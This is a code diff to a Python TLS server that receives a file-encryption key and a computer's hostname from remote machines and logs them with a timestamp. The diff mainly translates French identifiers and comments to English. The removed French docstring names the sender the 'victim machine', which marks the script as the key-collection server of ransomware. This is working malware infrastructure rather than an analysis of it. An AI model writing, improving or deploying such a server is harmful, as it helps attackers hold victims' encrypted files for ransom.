@@ -1,4 +1,4 @@
-# import :
+# import
 import socket, ssl
 from datetime import datetime
 # Variables :
@@ -6,34 +6,35 @@ host = ""
 port = 4000
 
 
-def storeKey(key, nom_ordi):
-    """ Store la clés sur le serveur avec des informations de la machine victime
-    :param key -- clé de dhiffrement:
+def store_key(key, hostname):
+    """
+    Strore the key on a remote server with the hostame
+    :param key -- key to encrypt files:
     """
     # Variables
-    fichier = "key_file.txt"
-    # Ajout de la clé, du nom d'ordinateur, de l'heure et date dans le fichier
-    with open(fichier, 'a+') as key_file:
-        key_file.write("\n" + key + "\t" + nom_ordi + "\t" + datetime.now().strftime("%d-%m-%Y %H:%M:%S"))
+    filename = "key_file.txt"
+    # Adding key, hostname, date and schedule in a file
+    with open(filename, 'a+') as key_file:
+        key_file.write("\n" + key + "\t" + hostname + "\t" + datetime.now().strftime("%d-%m-%Y %H:%M:%S"))
 
 
-# Création du socket
+# Create a socket
 sock = socket.socket()
 sock.bind((host, port))
 sock.listen(1)
 
-# Création et configuration du socket SSL
+# Create and configure the SSL/TLS socket
 context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
-# Certificat crée via openSSL
+# Loading the certificate (created with OpenSSL)
 context.load_cert_chain(certfile="cert.pem", keyfile="cert.pem")
 context.options |= ssl.PROTOCOL_TLSv1_2
 
-# Serveur à l'écoute
+# Server listening
 while True:
-    newsocket, fromaddr = sock.accept()
-    sslSocket = context.wrap_socket(newsocket, server_side=True)
-    # Réception de la clé et du nom de l'ordinateur
+    new_socket, from_addr = sock.accept()
+    sslSocket = context.wrap_socket(new_socket, server_side=True)
+    # Receive the key and hostname
     key = sslSocket.recv().decode()
-    nom_ordi = sslSocket.recv().decode()
-    # Appel de la fonction "storeKey()"
-    storeKey(key, nom_ordi)
+    hostname = sslSocket.recv().decode()
+    # Call the "store_key()" function
+    store_key(key, hostname)
